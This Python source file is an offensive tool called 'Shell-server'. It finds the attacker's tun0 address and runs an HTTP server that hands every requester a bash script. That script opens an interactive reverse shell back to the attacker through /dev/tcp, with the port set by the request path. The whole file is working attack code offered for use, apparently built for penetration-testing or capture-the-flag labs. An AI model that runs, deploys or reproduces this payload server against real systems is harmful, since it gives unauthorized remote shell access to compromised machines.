#!/usr/bin/env python3
import argparse, socket, http.server
from fcntl import ioctl
from struct import pack
from multiprocessing import Process

def print_info():
    print("""
   _____  _            _  _                                                 
  / ____|| |          | || |                                                
 | (___  | |__    ___ | || |  ______   ___   ___  _ __ __   __ ___  _ __    
  \___ \ |  _ \  / _ \| || | |______| / __| / _ \|  __|\ \ / // _ \|  __|   
  ____) || | | ||  __/| || |          \__ \|  __/| |    \ V /|  __/| |      
 |_____/ |_| |_| \___||_||_|          |___/ \___||_|     \_/  \___||_|      
  _               _____  _             ___           __          ____       
 | |             / ____|| |           / _ \         / /         / __ \      
 | |__   _   _  | |     | |__   _ __ | | | |__  __ / /_    ___ | |  | | ___ 
 |  _ \ | | | | | |     |  _ \ |  __|| | | |\ \/ /|  _ \  / _ \| |  | |/ __|
 | |_) || |_| | | |____ | | | || |   | |_| | >  < | (_) ||  __/| |__| |\__ \\
 |_.__/  \__, |  \_____||_| |_||_|    \___/ /_/\_\ \___/  \___| \____/ |___/
          __/ |                                                             
         |___/                                                              

Twitter:    https://twitter.com/Chr0x6eOs
Github:     https://github.com/Chr0x6eOs
____________________________________________________________________________
    """)

def gen_rev(ip:str="", port:int=443) -> str:
    # Create reverse-shell payload
    """
    Generate bash-reverse-shell payload
    """
    if ip == "":
        ip = RevServ.get_ip()
    return "#!/bin/bash\n" + f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"

class RevServ:
    # Current IP address
    ip = None
    
    # Listening port for http
    server_port = 80

    def __init__(self, server_port:int=80):
        self.ip = self.get_ip()
        if server_port != 80:
            self.server_port = server_port

    # Returns IP of the specified interface
    @staticmethod
    def get_ip(ifname:str="tun0") -> str:
        """
        Returns IP of specified  ifname
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(ioctl(s.fileno(), 0x8915,
                pack('256s', ifname[:15].encode()))[20:24])

    @staticmethod
    def port_in_use(port:int):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('localhost', port)) == 0

    # HTTP Handler to server payload files                     
    class RequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            print(f"[*] Served reverse-shell payload via http to {self.client_address[0]}!")
            file = ""
            access = self.path.strip("/")
            if access != "" and str.isdigit(access):
                # Example: /443 -> reverse-shell listens on port 443
                print(f"Generated reverse-shell payload for port {access}!")
                file = gen_rev(port=int(access))
            else:
                file = gen_rev()
            self.send_response(200)
            self.send_header("Content-type", "text/x-sh")
            self.end_headers()
            
            self.wfile.write(bytes(file, "utf8"))
        # Override log_request to silent messages
        def log_request(self, format, *args):
            return

   # Setup http-server                                                                                                   
    def setup_http(self) -> None:  
        """
        Setup an http-server to listen on port 80
        """
        try:
            if self.port_in_use(self.server_port):
                raise Exception(f"Port {self.server_port} in use!")
            handler = self.RequestHandler
            print(f"[*] Serving bash-reverse-shell on {self.get_ip()}:{self.server_port}...")
            with http.server.HTTPServer(("",self.server_port), handler) as httpd:
                httpd.serve_forever()
        except KeyboardInterrupt:                                                                                     
            quit()                                                                        
        except Exception as ex:
            raise Exception(f"Could not setup http-server because of an error: {ex}")

    def serve(self):
        """
        Setup and start the http listener in background
        """
        # Setup http server                                                                                               
        http = Process(target=self.setup_http)                                                                                 
        http.daemon = True                                                                                                
        http.start()

if __name__ == "__main__":
    print_info()
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", help="Port for http-server to listen", type=int)
    args = parser.parse_args()
    
    if args.port:
        server = RevServ(server_port=args.port)
    else:
        server = RevServ()
    server.setup_http()
